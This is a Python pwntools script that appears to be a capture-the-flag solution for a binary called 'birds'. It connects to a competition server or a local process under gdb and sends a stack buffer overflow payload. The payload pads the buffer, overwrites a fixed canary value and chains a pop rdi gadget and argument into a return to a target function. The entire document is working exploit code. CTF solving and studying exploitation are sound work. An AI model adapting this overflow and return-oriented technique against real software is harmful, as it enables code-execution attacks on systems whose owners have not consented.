#!/usr/bin/env python3

from pwn import *

exe = ELF("./birds")

context.binary = exe
gdb_script = '''
    b *main+111
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdb_script)
    else:
        r = remote("tjc.tf",  31625)

    return r


def main():
    r = conn()

    BIRDS_ADDR = 0x4011c4
    CANARY = 0xDEADBEEF
    PARAM1 = 0xA1B2C3D4
    POP_RDI = 0x00000000004011c0
    PADDING = 64


    payload = flat(
        b"A"*PADDING,
        b"B"*12,
        p64(CANARY),
        b"C"*4,
        p64(POP_RDI),
        p64(PARAM1),
        b"A"*8,
        p64(BIRDS_ADDR)
    )

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
